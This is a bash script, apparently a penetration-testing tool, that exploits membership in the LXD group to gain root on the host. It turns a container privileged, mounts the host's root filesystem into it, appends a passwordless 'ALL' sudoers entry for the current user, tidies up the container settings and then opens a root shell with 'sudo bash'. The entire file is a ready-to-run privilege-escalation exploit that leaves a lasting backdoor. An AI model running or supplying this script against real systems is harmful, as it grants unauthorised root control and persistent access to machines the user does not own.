#!/bin/bash
# LXD Privilege Escalation Method


# Allow Ctrl+C to kill process
trap '
  trap - INT # restore default INT handler
  kill -s INT "$$"
' INT


if [ -z "$1" ] || [ "$1" == '-h' ] || [ "$1" == '--help' ] ; then
# This option displays a help message and command execution examples
		echo ""
		echo "OsbornePro LXE Privilege Escalation 1.0 ( https://osbornepro.com )"
		echo ""
		echo "USAGE: ./lxd_privesc.sh <container name>"
		echo ""
		echo "OPTIONS:"
		echo "  -h : Displays the help information for the command."
		echo ""
		echo "EXAMPLES:"
		echo "  ./lxd_privesc.sh container1"
		echo "  # This example uses container1 to upgrade permissions for the current user"
		echo ""
		exit 0
fi

lxc stop "$1" 2> /dev/null
lxc config set "$1" security.privileged true || echo "[x] Failed to modify privilege"
lxc start "$1" || echo "[x] Failed to start container $1"
lxc config device add "$1" rootdisk disk source=/ path=/mnt/root recursive=true || echo "[x] Failed to mount filesystem"
lxc exec "$1" -- /bin/sh -c "echo $USER 'ALL=(ALL)' NOPASSWD: ALL >> /mnt/root/etc/sudoers" || echo "[x] Failed to add sudo privilege"
lxc config device remove "$1" rootdisk || echo "[x] Failed to unmount filesystem"
lxc config set "$1" security.privileged false || echo "[x] Failed to modify privilege"
lxc stop "$1"

echo "[*] Execution completed"

sudo id
sudo bash
